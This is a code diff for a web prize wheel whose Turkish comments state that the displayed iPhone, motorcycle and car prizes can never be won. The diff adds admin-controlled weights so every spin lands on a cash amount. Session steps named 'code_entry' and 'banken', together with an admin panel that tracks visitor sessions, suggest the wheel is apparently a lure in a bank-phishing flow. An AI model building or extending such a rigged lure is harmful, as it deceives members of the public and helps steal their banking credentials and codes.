@@ -36,7 +36,55 @@ const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
 const MAX_HISTORY_ITEMS = 5;
 const PRIZES: readonly PrizeSegment[] = WHEEL_PRIZES;
 
-const WINNABLE_PRIZES = PRIZES.filter((prize) => prize.kind === "amount");
+// Kazanilabilir NAKIT dilimleri — admin paneli wheel_settings.prizes
+// sirasiyla bu 5 girise karsilik gelir (amount/weight duzenlenebilir,
+// rotationIndex gorsele sabitlenmistir). iPhone/Motorrad/Auto/Erneut kazanilamaz.
+const CASH_SLOTS: Array<{ rotationIndex: number; amount: number; weight: number }> = [
+  { rotationIndex: 2, amount: 2000, weight: 20 },
+  { rotationIndex: 5, amount: 1500, weight: 25 },
+  { rotationIndex: 6, amount: 1000, weight: 30 },
+  { rotationIndex: 7, amount: 500, weight: 20 },
+  { rotationIndex: 8, amount: 2500, weight: 5 },
+];
+
+type WheelPrizeConfig = {
+  prizes: PrizeSegment[];
+  winnable: PrizeSegment[];
+  weights: Record<number, number>;
+};
+
+function buildWheelConfig(wheelSettings: unknown): WheelPrizeConfig {
+  const ws = wheelSettings && typeof wheelSettings === "object"
+    ? (wheelSettings as Record<string, unknown>)
+    : null;
+  const raw = ws?.prizes;
+  const entries = CASH_SLOTS.map((def, i) => {
+    const entry = Array.isArray(raw) ? (raw[i] as { amount?: unknown; weight?: unknown } | undefined) : undefined;
+    const amount = Number(entry?.amount);
+    const weight = Number(entry?.weight);
+    return {
+      rotationIndex: def.rotationIndex,
+      amount: Number.isFinite(amount) && amount > 0 ? Math.round(amount) : def.amount,
+      weight: Number.isFinite(weight) && weight >= 0 ? Math.round(weight) : def.weight,
+    };
+  });
+
+  const prizes: PrizeSegment[] = WHEEL_PRIZES.map((prize) => {
+    const slotIdx = CASH_SLOTS.findIndex((slot) => slot.rotationIndex === prize.rotationIndex);
+    if (slotIdx === -1) return prize;
+    const e = entries[slotIdx];
+    const label = `${WHEEL_CURRENCY}${e.amount.toLocaleString("en-US")}`;
+    return { ...prize, amount: e.amount, text: label, popupLines: [`€ ${formatAmount(e.amount)}`] };
+  });
+  const weights: Record<number, number> = {};
+  entries.forEach((e) => { weights[e.rotationIndex] = e.weight; });
+  const winnable = prizes.filter(
+    (prize) => prize.kind === "amount" && (weights[prize.rotationIndex] ?? 0) > 0,
+  );
+  return { prizes, winnable, weights };
+}
+
+const DEFAULT_WHEEL_CONFIG: WheelPrizeConfig = buildWheelConfig(null);
 
 function normalizeAngle(angle: number) {
   return ((angle % 360) + 360) % 360;
@@ -53,35 +101,43 @@ function getTargetRotation(currentRotation: number, rotationIndex: number) {
   return currentRotation + MIN_FULL_SPINS * 360 + delta;
 }
 
-function getPrizeFromSession(session: SessionRecord | null) {
+function getPrizeFromSession(session: SessionRecord | null, prizes: PrizeSegment[]) {
   const storedRotationIndex = session?.form_data?.wheel_rotation_index;
   if (typeof storedRotationIndex === "number") {
-    const p = getWheelPrizeByRotationIndex(storedRotationIndex);
+    const p = prizes.find((x) => x.rotationIndex === storedRotationIndex);
     if (p) return p;
   }
 
   const storedLabel = session?.form_data?.wheel_result_label;
   if (typeof storedLabel === "string") {
-    const p = getWheelPrizeByText(storedLabel);
+    const p = prizes.find((x) => x.text === storedLabel);
     if (p) return p;
   }
 
   const storedAmount = session?.form_data?.wheel_result_amount;
   if (typeof storedAmount === "number" && storedAmount > 0) {
-    const p = getWheelPrizeByAmount(storedAmount);
+    const p = prizes.find((x) => x.amount === storedAmount);
     if (p) return p;
   }
 
   if (typeof session?.amount === "number" && session.amount > 0) {
-    const p = getWheelPrizeByAmount(session.amount);
+    const p = prizes.find((x) => x.amount === session.amount);
     if (p) return p;
   }
 
   return null;
 }
 
-function getRandomWinnablePrize() {
-  return WINNABLE_PRIZES[Math.floor(Math.random() * WINNABLE_PRIZES.length)];
+// Agirlikli rastgele odul secimi (admin panelindeki % agirliklara gore)
+function getRandomWinnablePrize(cfg: WheelPrizeConfig) {
+  const weightedList: PrizeSegment[] = [];
+  for (const prize of cfg.winnable) {
+    const weight = cfg.weights[prize.rotationIndex] ?? 1;
+    for (let i = 0; i < weight; i++) weightedList.push(prize);
+  }
+  if (weightedList.length === 0)
+    return cfg.winnable[0] ?? cfg.prizes.find((p) => p.kind === "amount") ?? cfg.prizes[0];
+  return weightedList[Math.floor(Math.random() * weightedList.length)];
 }
 
 function getRotationIndexFromRotation(rotation: number) {
@@ -89,9 +145,9 @@ function getRotationIndexFromRotation(rotation: number) {
   return Math.round(normalizeAngle(ANGLE_OFFSET - normalizedRotation) / 40) % PRIZES.length;
 }
 
-function getPrizeFromRotation(rotation: number) {
+function getPrizeFromRotation(rotation: number, prizes: PrizeSegment[]) {
   const landedRotationIndex = getRotationIndexFromRotation(rotation);
-  return PRIZES.find((prize) => prize.rotationIndex === landedRotationIndex) ?? null;
+  return prizes.find((prize) => prize.rotationIndex === landedRotationIndex) ?? null;
 }
 
 function logWheelEvent(eventName: "wheel_spin" | "wheel_win" | "popup_open" | "popup_close", payload?: Record<string, unknown>) {
@@ -154,6 +210,7 @@ export function WheelClient({
   const supabase = createBrowserSupabaseClient();
   const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
   const pendingPrizeRef = useRef<PrizeSegment | null>(null);
+  const wheelCfgRef = useRef<WheelPrizeConfig>(DEFAULT_WHEEL_CONFIG);
   const rotationRef = useRef(0);
 
   const [spinning, setSpinning] = useState(false);
@@ -165,6 +222,11 @@ export function WheelClient({
   const [isViewportReady, setIsViewportReady] = useState(false);
   const [winHistory, setWinHistory] = useState<WinHistoryItem[]>([]);
   const [popupOpen, setPopupOpen] = useState(false);
+  const [wheelCfg, setWheelCfgState] = useState<WheelPrizeConfig>(DEFAULT_WHEEL_CONFIG);
+  const setWheelCfg = (cfg: WheelPrizeConfig) => {
+    wheelCfgRef.current = cfg;
+    setWheelCfgState(cfg);
+  };
   const continueButtonRef = useRef<HTMLButtonElement | null>(null);
   const isMobileViewport = useIsMobile();
 
@@ -206,6 +268,16 @@ export function WheelClient({
 
       const nextSession = data as SessionRecord;
 
+      // Admin wheel_settings.prizes -> cark odul/sans yapilandirmasi
+      try {
+        const { data: gs } = await supabase
+          .from("global_settings")
+          .select("wheel_settings")
+          .limit(1)
+          .single();
+        if (!cancelled && gs?.wheel_settings) setWheelCfg(buildWheelConfig(gs.wheel_settings));
+      } catch {}
+
       // Eğer admin paneli normal link olarak açmışsa ama kullanıcı çark sayfasındaysa,
       // admin panelinde "ÇARK OYUNU" yazması için is_wheel_game'i true yapalım.
       if (nextSession.current_step === "code_entry") {
@@ -227,7 +299,7 @@ export function WheelClient({
 
       setSessionData(nextSession);
 
-      const restoredPrize = getPrizeFromSession(nextSession);
+      const restoredPrize = getPrizeFromSession(nextSession, wheelCfgRef.current.prizes);
       if (restoredPrize && (nextSession.current_step === "win" || nextSession.current_step === "banken")) {
         setResultPrize(restoredPrize);
         // ⭐ FLASH YOK: Eski 2000ms setTimeout KALDIRILDI. HEMEN yönlendir (replace).
@@ -410,7 +482,7 @@ export function WheelClient({
       return;
     }
 
-    const nextPrize = getRandomWinnablePrize();
+    const nextPrize = getRandomWinnablePrize(wheelCfgRef.current);
     const startRotation = rotationRef.current;
     const targetRotation = getTargetRotation(startRotation, nextPrize.rotationIndex);
 
@@ -428,7 +500,7 @@ export function WheelClient({
       return;
     }
 
-    const settledPrize = getPrizeFromRotation(rotationRef.current) ?? pendingPrizeRef.current;
+    const settledPrize = getPrizeFromRotation(rotationRef.current, wheelCfgRef.current.prizes) ?? pendingPrizeRef.current;
     pendingPrizeRef.current = null;
     void finalizeSpin(settledPrize);
   };
